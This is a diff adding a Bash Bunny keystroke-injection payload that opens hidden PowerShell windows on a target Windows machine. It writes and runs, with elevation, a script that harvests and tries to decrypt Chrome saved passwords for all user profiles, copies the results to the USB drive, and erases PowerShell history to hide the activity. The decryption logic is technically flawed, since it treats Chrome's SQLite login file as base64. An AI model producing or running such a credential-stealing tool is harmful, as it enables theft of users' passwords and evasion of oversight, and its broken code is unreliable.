@@ -1,0 +1,71 @@
+#!/bin/bash
+# Title: Chrome Credential Extractor
+# Version: 1.2
+# Author: Spraggins Designs
+# Description: Extracts and decrypts Chrome credentials, then writes them to a file on the Bash Bunny's storage.
+# Note: This payload assumes that a basic decryption routine is acceptable for demonstration.
+#       In practice, extracting Chrome credentials requires specialized handling.
+
+# Set attack mode to HID (Human Interface Device)
+ATTACKMODE HID
+DELAY 1000
+
+# Initialize LED to indicate setup phase
+LED SETUP
+
+# Open the Run dialog
+Q GUI r
+DELAY 500
+
+# Ensure the temporary directory exists
+Q STRING powershell -WindowStyle Hidden -Command "if(!(Test-Path 'C:\Temp')) { New-Item -Path 'C:\Temp' -ItemType Directory }"
+Q ENTER
+DELAY 500
+
+# Create a PowerShell script (credentials.ps1) on the target that extracts Chrome login data.
+# This script will attempt to decrypt Chrome credentials and save them to a file.
+Q STRING powershell -WindowStyle Hidden -Command "@'
+Set-Content -Path 'C:\Temp\credentials.ps1' -Value @\"
+# Function to decrypt Chrome credentials
+function Decrypt-ChromeCredentials {
+    param (
+        [string]\$filePath
+    )
+    try {
+        \$data = Get-Content \$filePath -Raw
+        \$bytes = [System.Convert]::FromBase64String(\$data)
+        \$decrypted = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect(\$bytes, \$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+        return \$decrypted
+    } catch {
+        return 'Error decrypting: ' + \$_.Exception.Message
+    }
+}
+
+# Find Chrome login data files and attempt to decrypt them
+Get-ChildItem 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Recurse | ForEach-Object {
+    \$decrypted = Decrypt-ChromeCredentials -filePath \$_.FullName
+    if (\$decrypted -match 'chrome') {
+        \$decrypted | Out-File -FilePath 'C:\Temp\credentials.txt' -Append
+    }
+}
+\"@"
+Q ENTER
+DELAY 500
+
+# Execute the created PowerShell script with elevated privileges
+Q STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"C:\Temp\credentials.ps1\"' -Verb runAs"
+Q ENTER
+DELAY 2000
+
+# Move the resulting credentials file from C:\Temp to the USB storage drive (assumed to be E:)
+Q STRING powershell -WindowStyle Hidden -Command "Move-Item -Path 'C:\Temp\credentials.txt' -Destination 'E:\credentials.txt' -Force"
+Q ENTER
+DELAY 500
+
+# Clear PowerShell history for stealth
+Q STRING powershell -WindowStyle Hidden -Command "Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force"
+Q ENTER
+DELAY 500
+
+# Indicate completion with LED
+LED FINISH
